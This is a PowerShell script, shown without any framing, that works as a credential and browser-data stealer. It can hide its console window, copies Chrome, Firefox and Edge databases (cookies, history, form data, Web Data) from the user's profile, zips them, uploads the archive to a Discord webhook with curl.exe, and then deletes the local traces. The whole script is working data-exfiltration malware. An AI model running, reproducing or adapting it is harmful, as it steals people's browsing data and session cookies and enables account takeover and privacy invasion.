
# Uncomment $hide='y' below to hide the console
# $hide='y'

if($hide -eq 'y'){
    $w=(Get-Process -PID $pid).MainWindowHandle
    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
    $t=Add-Type -M $a -Name Win32ShowWindowAsync -Names Win32Functions -Pass
    if($w -ne [System.IntPtr]::Zero){
        $t::ShowWindowAsync($w,0)
    }else{
        $Host.UI.RawUI.WindowTitle = 'xx'
        $p=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'})
        $w=$p.MainWindowHandle
        $t::ShowWindowAsync($w,0)
    }
}


$dc = "$dc"
if ($dc.Length -lt 120){
	$dc = ("https://discord.com/api/webhooks/" + "$dc")
}

$temp = [System.IO.Path]::GetTempPath() 
$tempFolder = Join-Path -Path $temp -ChildPath 'dbfiles'
$googledest = Join-Path -Path $tempFolder -ChildPath 'google'
$mozdest = Join-Path -Path $tempFolder -ChildPath 'firefox'
$edgedest = Join-Path -Path $tempFolder -ChildPath 'edge'
New-Item -Path $tempFolder -ItemType Directory -Force
sleep 1
New-Item -Path $googledest -ItemType Directory -Force
New-Item -Path $mozdest -ItemType Directory -Force
New-Item -Path $edgedest -ItemType Directory -Force

sleep 1

Function CopyFiles {

    param ([string]$dbfile,[string]$folder,[switch]$db)

    Write-Host "Input : $dbfile Selected"
    Write-Host "Folder : $folder Selected"

    $filesToCopy = Get-ChildItem -Path $dbfile -Filter '*' -Recurse | Where-Object { $_.Name -like 'Web Data' -or $_.Name -like 'History' -or $_.Name -like 'formhistory.sqlite' -or $_.Name -like 'places.sqlite' -or $_.Name -like 'cookies.sqlite'}

    foreach ($file in $filesToCopy) {
        
        Write-Host $file
        $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
        if ($db -eq $true){
            $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension + '.db'
        }
        else{
            $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension 
        }
        $destination = Join-Path -Path $folder -ChildPath $newFileName
        Copy-Item -Path $file.FullName -Destination $destination -Force
    }

} 

$script:googleDir = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
$script:firefoxDir = Get-ChildItem -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory | Where-Object { $_.Name -like '*.default-release' };$firefoxDir = $firefoxDir.FullName
$script:edgeDir = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data"

copyFiles -dbfile $googleDir -folder $googledest -db
copyFiles -dbfile $firefoxDir -folder $mozdest
copyFiles -dbfile $edgeDir -folder $edgedest -db

$zipFileName = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "dbfiles.zip")
Compress-Archive -Path $tempFolder -DestinationPath $zipFileName

Remove-Item -Path $tempFolder -Recurse -Force

curl.exe -F file1=@"$zipFileName" $dc | Out-Null
sleep 1
Remove-Item -Path $zipFileName -Recurse -Force
